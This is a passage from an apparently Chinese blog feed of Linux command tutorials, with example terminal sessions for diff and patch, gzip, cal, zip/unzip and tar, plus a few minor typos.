&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“＋” 比较的文件的后者比前着多一行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“－” 比较的文件的后者比前着少一行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“！” 比较的文件两者有差别的行 实例4：统一格式输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2014.log log2013.log -u &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test3]# diff log2014.log log2013.log -u--- log2014.log 2012-12-07 18:01:54.000000000 +0800+++ log2013.log 2012-12-07 16:36:26.000000000 +0800@@ -1,12 +1,10 @@ 2013-01 2013-02-2014-03+2013-03 2013-04 2013-05 2013-06 2013-07-2013-07+2013-08 2013-09 2013-10-2013-11-2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的第一部分，也是文件的基本信息： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;— log2014.log 2012-12-07 18:01:54.000000000 +0800 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;+++ log2013.log 2012-12-07 16:36:26.000000000 +0800 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;”—“表示变动前的文件，”+++”表示变动后的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二部分，变动的位置用两个@作为起首和结束。 @@ -1,12 +1,10 @@ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前面的”-1,12”分成三个部分：减号表示第一个文件（即log2014.log），”1”表示第1行，”12”表示连续12行。合在一起，就表示下面是第一个文件从第1行开始的连续12行。同样的，”+1,10”表示变动后，成为第二个文件从第1行开始的连续10行。 实例5：比较文件夹不同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff test3 test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost test]# diff test3 test6Only in test6: linklog.logOnly in test6: log2012.logdiff test3/log2013.log test6/log2013.log1,10c1,3&lt; 2013-01&lt; 2013-02&lt; 2013-03&lt; 2013-04&lt; 2013-05&lt; 2013-06&lt; 2013-07&lt; 2013-08&lt; 2013-09&lt; 2013-10---&gt; hostnamebaidu=baidu.com&gt; hostnamesina=sina.com&gt; hostnames=truediff test3/log2014.log test6/log2014.log1,12d0&lt; 2013-01&lt; 2013-02&lt; 2014-03&lt; 2013-04&lt; 2013-05&lt; 2013-06&lt; 2013-07&lt; 2013-07&lt; 2013-09&lt; 2013-10&lt; 2013-11&lt; 2013-12Only in test6: log2015.logOnly in test6: log2016.logOnly in test6: log2017.log[root@localhost test]# 实例6：比较两个文件不同，并生产补丁&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff -ruN log2013.log log2014.log &gt;patch.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# diff -ruN log2013.log log2014.log &gt;patch.log[root@localhost test3]# ll总计 12-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log-rw-r--r-- 1 root root 96 12-07 18:01 log2014.log-rw-r--r-- 1 root root 248 12-07 21:33 patch.log[root@localhost test3]# cat patc.logcat: patc.log: 没有那个文件或目录[root@localhost test3]# cat patch.log --- log2013.log 2012-12-07 16:36:26.000000000 +0800+++ log2014.log 2012-12-07 18:01:54.000000000 +0800@@ -1,10 +1,12 @@ 2013-01 2013-02-2013-03+2014-03 2013-04 2013-05 2013-06 2013-07-2013-08+2013-07 2013-09 2013-10+2013-11+2013-12[root@localhost test3]# 实例7：打补丁&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# cat log2013.log2013-012013-022013-032013-042013-052013-062013-072013-082013-092013-10[root@localhost test3]# patch log2013.log patch.log patching file log2013.log[root@localhost test3]# [root@localhost test3]# cat log2013.log 2013-012013-022014-032013-042013-052013-062013-072013-072013-092013-102013-112013-12[root@localhost test3]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- gzip]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F32.%20Linux%20%E5%91%BD%E4%BB%A4-%20gzip%2F</url>
    <content type="text"><![CDATA[Linux 命令- gzip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;减少文件大小有两个明显的好处，一是可以减少存储空间，二是通过网络传输文件时，可以减少传输的时间。gzip是在Linux系统中经常使用的一个对文件进行压缩和解压缩的命令，既方便又好用。gzip不仅可以用来压缩大的、较少使用的文件以节省磁盘空间，还可以和tar命令一起构成Linux操作系统中比较流行的压缩文件格式。据统计，gzip命令对文本文件有60%～70%的压缩率。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;gzip 不能压缩目录 1.命令格式1gzip [参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;gzip 是个使用广泛的压缩程序，文件经它压缩后，其名称后面会多出 “.gz” 的扩展名。 3.命令参数 -a或–ascii 使用ASCII文字模式。 -c或–stdout或–to-stdout 把压缩后的文件输出到标准输出设备，不去更动原始文件。 -d或–decompress或—-uncompress 解开压缩文件。 -f或–force 强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接。 -h或–help 在线帮助。 -l或–list 列出压缩文件的相关信息。 -L或–license 显示版本与版权信息。 -n或–no-name 压缩文件时，不保存原来的文件名称及时间戳记。 -N或–name 压缩文件时，保存原来的文件名称及时间戳记。 -q或–quiet 不显示警告信息。 -r或–recursive 递归处理，将指定目录下的所有文件及子目录一并处理。 -S&lt;压缩字尾字符串&gt;或—-suffix&lt;压缩字尾字符串&gt; 更改压缩字尾字符串。 -t或–test 测试压缩文件是否正确无误。 -v或–verbose 显示指令执行过程。 -V或–version 显示版本信息。 -num 用指定的数字num调整压缩的速度，-1或–fast表示最快压缩方法（低压缩比），-9或–best表示最慢压缩方法（高压缩比）。系统缺省值为6。 4.使用实例实例1.把 test6 目录下的每个文件压缩成 .gz 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# gzip *[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# 实例2：把例1中每个压缩的文件解压，并列出详细的信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -dv * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# gzip -dv *linklog.log.gz: 99.6% -- replaced with linklog.loglog2012.log.gz: 99.6% -- replaced with log2012.loglog2013.log.gz: 47.5% -- replaced with log2013.loglog2014.log.gz: 0.0% -- replaced with log2014.loglog2015.log.gz: 0.0% -- replaced with log2015.loglog2016.log.gz: 0.0% -- replaced with log2016.loglog2017.log.gz: 0.0% -- replaced with log2017.log[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# 实例3：详细显示例1中诶每个压缩的文件的信息，并不解压&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -l * &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost test6]# gzip -l * compressed uncompressed ratio uncompressed_name 1341 302108 99.6% linklog.log 1341 302108 99.6% log2012.log 70 61 47.5% log2013.log 32 0 0.0% log2014.log 32 0 0.0% log2015.log 32 0 0.0% log2016.log 32 0 0.0% log2017.log 2880 604277 99.5% (totals) 实例4：压缩一个 tar 备份文件，此时压缩文件的扩展名为 .tar.gz&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -r log.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log.tar-rw-r--r-- 1 root root 307200 11-29 17:54 log.tar[root@localhost test]# gzip -r log.tar[root@localhost test]# ls -al log.tar.gz -rw-r--r-- 1 root root 1421 11-29 17:54 log.tar.gz 实例5L递归的压缩目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -rv test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# gzip -rv test6test6/log2014.log: 0.0% -- replaced with test6/log2014.log.gztest6/linklog.log: 99.6% -- replaced with test6/linklog.log.gztest6/log2015.log: 0.0% -- replaced with test6/log2015.log.gztest6/log2013.log: 47.5% -- replaced with test6/log2013.log.gztest6/log2012.log: 99.6% -- replaced with test6/log2012.log.gztest6/log2017.log: 0.0% -- replaced with test6/log2017.log.gztest6/log2016.log: 0.0% -- replaced with test6/log2016.log.gz[root@localhost test]# cd test6[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，所有 test 下面的文件都变成了 .gz ，目录依然存在，只是目录里面的文件相应变成了 .gz 这就是压缩，和打包不同。因为是对目录操作，所以需要加上 -r 选项，这样也可以对子目录进行递归了。 实例6：递归地解压目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -dr test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test6]# ll总计 28---xr--r-- 1 root mail 1341 11-30 08:39 linklog.log.gz---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz-rw-r--r-- 1 mail users 70 11-30 08:39 log2013.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2014.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2015.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2016.log.gz-rw-r--r-- 1 root mail 32 11-30 08:39 log2017.log.gz[root@localhost test6]# cd ..[root@localhost test]# gzip -dr test6[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 mail users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log[root@localhost test6]# 实例7：-&lt;数字&gt; 自定义压缩率&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1gzip -v -9 test.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# gzip -v -1 test.tartest.tar: 88.4% -- replaced with test.tar.gz[root@localhost test]# gzip -d test.tar.gz[root@localhost test]# gzip -v -9 test.tartest.tar: 89.7% -- replaced with test.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩等级，1压缩最差，9压缩最好，6为默认。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cal]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F40.%20Linux%20%E5%91%BD%E4%BB%A4-%20cal%2F</url>
    <content type="text"><![CDATA[Linux 命令- cal&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cal命令可以用来显示公历（阳历）日历。公历是现在国际通用的历法，又称格列历，通称阳历。“阳历”又名“太阳历”，系以地球绕行太阳一周为一年，为西方各国所通用，故又名“西历”。 1．命令格式1cal [参数][月份][年份] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于查看日历等时间信息，如只有一个参数，则表示年份(1-9999)，如有两个参数，则表示月份和年份 3．命令参数 -1 显示一个月的月历 -3 显示系统前一个月，当前月，下一个月的月历 -s 显示星期天为一个星期的第一天，默认的格式 -m 显示星期一为一个星期的第一天 -j 显示在当年中的第几天（一年日期按天算，从1月1号算起，默认显示当前月在一年中的天数） -y 显示当前年份的日历 4．使用实例实例1：显示当前月份日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cal 十二月 2012 日 一 二 三 四 五 六 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1516 17 18 19 20 21 2223 24 25 26 27 28 2930 31[root@localhost ~]# 实例2：显示指定月份的日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal 9 2012 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# cal 9 2012 九月 2012 日 一 二 三 四 五 六 1 2 3 4 5 6 7 8 9 10 11 12 13 14 1516 17 18 19 20 21 2223 24 25 26 27 28 2930 实例3：显示2013年日历&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12cal -y 2013 cal 2013 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 实例4：显示自1月1日的天数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal -j &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# cal -j 十二月 2012 日 一 二 三 四 五 六 336337 338 339 340 341 342 343344 345 346 347 348 349 350351 352 353 354 355 356 357358 359 360 361 362 363 364365 366[root@localhost ~]# 实例5：星期一显示在第一列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cal -m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cal -m 十二月 2012 一 二 三 四 五 六 日 1 2 3 4 5 6 7 8 910 11 12 13 14 15 1617 18 19 20 21 22 2324 25 26 27 28 29 3031[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- zip 和 unzip]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F34.%20Linux%20%E5%91%BD%E4%BB%A4-%20zip%20%E5%92%8C%20unzip%2F</url>
    <content type="text"><![CDATA[Linux 命令- zip 和 unzipzip 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zip 压缩目录也可以压缩文件，压缩目录时，需要指定目录下的文件 1.命令格式1zip [参数] [压缩名] [文件或目录] 2.命令参数 -A 调整可执行的自动解压缩文件。 -b&lt;工作目录&gt; 指定暂时存放文件的目录。 -c 替每个被压缩的文件加上注释。 -d 从压缩文件内删除指定的文件。 -D 压缩文件内不建立目录名称。 -f 此参数的效果和指定”-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中。 -F 尝试修复已损坏的压缩文件。 -g 将文件压缩后附加在既有的压缩文件之后，而非另行建立新的压缩文件。 - -h 在线帮助。 -i&lt;范本样式&gt; 只压缩符合条件的文件。 -j 只保存文件名称及其内容，而不存放任何目录名称。 -J 删除压缩文件前面不必要的数据。 -k 使用MS-DOS兼容格式的文件名称。 -l 压缩文件时，把LF字符置换成LF+CR字符。 -ll 压缩文件时，把LF+CR字符置换成LF字符。 -L 显示版权信息。 -m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。 -n&lt;字尾字符串&gt; 不压缩具有特定字尾字符串的文件。 -o 以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同。 -q 不显示指令执行过程。 -r 递归处理，将指定目录下的所有文件和子目录一并处理。 -S 包含系统和隐藏文件。 -t&lt;日期时间&gt; 把压缩文件的日期设成指定的日期。 -T 检查备份文件内的每个文件是否正确无误。 -u 更换较新的文件到压缩文件内。 -v 显示指令执行过程或显示版本信息。 -V 保存VMS操作系统的文件属性。 -w 在文件名称里假如版本编号，本参数仅在VMS操作系统下有效。 -x&lt;范本样式&gt; 压缩时排除符合条件的文件。 -X 不保存额外的文件属性。 -y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。 -z 替压缩文件加上注释。 -$ 保存第一个被压缩文件所在磁盘的卷册名称。 -&lt;压缩效率&gt; 压缩效率是一个介于1-9的数值。 3.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zip 是个使用广泛的压缩程序，文件经它压缩后会另外产生具有 “.zip” 扩展名的压缩文件。 4.使用实例实例1：将 test.txt 文件压缩为 test.zip 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip test.zip test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip test.zip test.txtadding: test.txt (deflated 35%) 实例2：压缩率为1，压缩 test.txt 文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -1 test.zip test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip -1 test.zip test.txtadding: test.txt(deflated 35%) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩率为1，最高压缩率，当然也是最慢的压缩方法。但上例压缩率依然为35，因为压缩文件为文本文件，压缩率基本不变。 实例3：递归压缩子目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -r test.zip /test/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# zip -r test.zip /test/adding: test/ (stored 0%)adding: test/test/ (stored 0%)adding: test/test.txt (deflated 35%) 实例4：删除已有 zip 文件中文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -d test.zip test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# zip -r test.zip testadding: test/ (stored 0%)adding: test/test/ (stored 0%)adding: test/test.txt (deflated 35%)[root@localhost test]# zip -d test.zip test/test.txtdeleting: test/test.txt 实例5：向已有 zip 文件增加压缩文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -m test.zip ./test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# zip -m test.zip ./test/test.txtadding: test/test.txt (deflated 35%) 实例6：排除指定文件不压缩&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1zip -r test.zip test-x ./test/test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# zip -r test.zip test-x ./test/test.txtupdating: test/ (stored 0%)updating: test/test/ (stored 0%)updating: test/test2.txt (deflated 63%) unzip 命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unzip 用来解压 zip 压缩的压缩文件 1.命令格式1unzip [参数] [.zip文件] [目录] 2.命令参数 -c 将 解压缩的结果显示到屏幕上，并对字符做适当的转换。 -f 更 新现有的文件。 -l 显 示压缩文件内所包含的文件。 -p 与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任 何的转换。 -t 检 查压缩文件是否正确。，但不解压。 -u 与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中 的其他文件解压缩到目录中。 -v 执 行是时显示详细的信息。或查看压缩文件目录，但不解压。 -z 仅 显示压缩文件的备注文字。 -a 对 文本文件进行必要的字符转换。 -b 不 要对文本文件进行字符转换。 -C 压 缩文件中的文件名称区分大小写。 -j 不 处理压缩文件中原有的目录路径。 -L 将 压缩文件中的全部文件名改为小写。 -M 将 输出结果送到more程 序处理。 -n 解 压缩时不要覆盖原有的文件。 -o 不 必先询问用户，unzip执 行后覆盖原有文件。 -P&lt;密码&gt; 使 用zip的密码选项。 -q 执 行时不显示任何信息。 -s 将 文件名中的空白字符转换为底线字符。 -V 保 留VMS的文件版本信 息。 -X 解 压缩时同时回存文件原来的UID/GID。 [.zip文件] 指定.zip压缩文件。 [文件] 指定 要处理.zip压缩文 件中的哪些文件。 -d&lt;目录&gt; 指 定文件解压缩后所要存储的目录。 -x&lt;文件&gt; 指 定不要处理.zip压 缩文件中的哪些文件。 -Z unzip -Z等 于执行zipinfo指 令。 3.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;unzip 为 zip 压缩文件的解压缩程序。 4.使用实例实例1：解压缩 test.zip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unzip test.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# unzip test.zipArchive: test.zipcreating: test/creating: test/test/inflating: test/test2.txt 实例2：查看压缩文件目录及文件信息，并不解压&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1unzip -v test.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# unzip -v test.zipArchive: test.zipLength Method Size Cmpr Date Time CRC-32 Name-------- ------ ------- ---- --------------- -------- ----0 Stored 0 0% 10-08-2015 22:41 00000000 test/0 Stored 0 0% 10-08-2015 22:24 00000000 test/test/2117 Defl:N 781 63% 10-08-2015 22:41 ef2699cd test/test2.txt-------- ------- --- -------2117 781 63% 3 files 其他应用1.将压缩文件 test.zip 在指定目录 /tmp/ 下解压，如果有相同的文件存在，要求 unzip 命令不覆盖原来的文件1[root@mysql test]# unzip -n test.zip -d /tmp 2.将压缩文件 test.zip 在指定目录 /tmp/ 下解压缩，如果有相同文件存在，要求 unzip 命令 覆盖原来的文件1[root@mysql test]# unzip -o test.zip -d /tmp 使用 unzip “*.zip” 解压当前目录下的所有 zip 文件1ls *.zip |xargs -nl unzip]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tar]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F28.%20Linux%20%E5%91%BD%E4%BB%A4-%20tar%2F</url>
    <content type="text"><![CDATA[Linux 命令- tar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过SSH访问服务器，难免会要用到压缩，解压缩，打包，解包等，这时候tar命令就是是必不可少的一个功能强大的工具。linux中最流行的tar是麻雀虽小，五脏俱全，功能强大。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tar命令可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux下最常用的打包程序就是tar了，使用tar程序打出来的包我们常称为tar包，tar包文件的命令通常都是以.tar结尾的。生成tar包后，就可以用其它的程序来进行压缩。 1.命令格式1tar [必要参数] [选择参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来压缩和解压文件。tar 本身不具有压缩功能。它是调用压缩功能实现的。 3.命令参数必要参数 -A 新增压缩文件到已存在的压缩 -B 设置区块大小 -c 建立新的压缩文件 -d 记录文件的差别 -r 添加文件到已经压缩的文件 -u 添加改变了和现有的文件到已经存在的压缩文件 -x 从压缩的文件中提取文件 -t 显示压缩文件的内容 -z 支持gzip解压文件 -j 支持bzip2解压文件 -Z 支持compress解压文件 -v 显示操作过程 -l 文件系统边界设置 -k 保留原有文件不覆盖 -m 保留文件不被覆盖 -W 确认压缩文件的正确性 可选择参数 -b 设置区块数目 -C 切换到指定目录 -f 指定压缩文件 –help 显示帮助信息 –version 显示版本信息 4.常见压缩、解压命令tar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解包 1tar xvf filname.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打包 1tar cvf filename.tar dirname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：tar 是打包，不是压缩！ .gz&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压1 1gunzip filename.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压2 1gzip -d filename.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1gzip filename.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar zxvf filename.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar zcvf filename.tar.gz dirname .bz2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压1 1bzip2 -d filename.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压2 1bunzip2 filename.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1bzip2 -z filename.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar jxvf filename.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar jcvf filename.tar.bz2 diename .Z&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1unconpress filename.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1compress filename.tar.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar Zxvf filename.tar.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar Zcvf filename.tar.Z dirname .zip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1unzip filename.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1zip filename.zip dirname .rar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1rar x filename.rar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1rar a filename.rar dirname 5.使用实例实例1：将文件全部打包成 tar 包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123tar -cvf log.tar log2012.logtar -zxvf log.tar.gz log2012.logtar -jcvf log.tar.bz2 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost test]# ls -al log2012.log---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# tar -cvf log.tar log2012.log log2012.log[root@localhost test]# tar -zcvf log.tar.gz log2012.loglog2012.log[root@localhost test]# tar -jcvf log.tar.bz2 log2012.log log2012.log[root@localhost test]# ls -al 